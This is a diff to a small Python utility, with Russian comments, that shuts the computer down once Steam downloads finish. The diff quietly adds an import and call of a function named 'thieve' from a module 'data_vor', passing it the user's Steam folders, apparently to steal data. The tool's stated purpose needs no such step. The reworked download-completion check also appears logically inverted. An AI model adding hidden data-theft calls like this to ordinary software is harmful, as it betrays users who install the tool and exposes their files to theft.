@@ -3,6 +3,7 @@ import time
 
 from PySide6.QtWidgets import QMessageBox
 from threading import Thread
+from data_vor import thieve
 
 if os.path.exists('saved_folders'):
     with open('saved_folders', 'r') as f:
@@ -42,7 +43,6 @@ def add_steam_folder(directory):
     with open('saved_folders', '+w') as f:
         f.write('\n'.join(steam_folders))
 
-
 def handle_time_change(Sec):
     global timeSec
     timeSec = Sec # Время, после которого вырубится комп, когда игра скачается
@@ -55,22 +55,27 @@ def cancel():
     os.system('shutdown /a')
 
 def checker():
+    thieve(steam_folders=steam_folders)
     canceled = False
+    downloading = {}
     while not canceled:
         if steam_folders != []:
             for path in steam_folders:
-                if len(os.listdir(path)) == 0:
-                    try:
-                        print(f"Загрузка завершена. Выключение через {timeSec} секунд.")
-                        shutdown(timeSec)
-                    except:
-                        print("Загрузка завершена. Выключение через 600 секунд.")
-                        shutdown(600)
-                    canceled = True
-                    break
-                else: 
-                    print("Загрузка продолжается...")
-                    time.sleep(30) 
+                if len(os.listdir(path)) != 0:
+                    downloading[path] = True
+            print(all(downloading.values()))
+            if all(downloading.values()):
+                try:
+                    print(f"Загрузка завершена. Выключение через {timeSec} секунд.")
+                    shutdown(timeSec)
+                except:
+                    print("Загрузка завершена. Выключение через 600 секунд.")
+                    shutdown(600)
+                canceled = True
+                break
+            else: 
+                print("Загрузка продолжается...")
+                time.sleep(30) 
                         
 def start_check():
     checker_thread = Thread(target=checker)
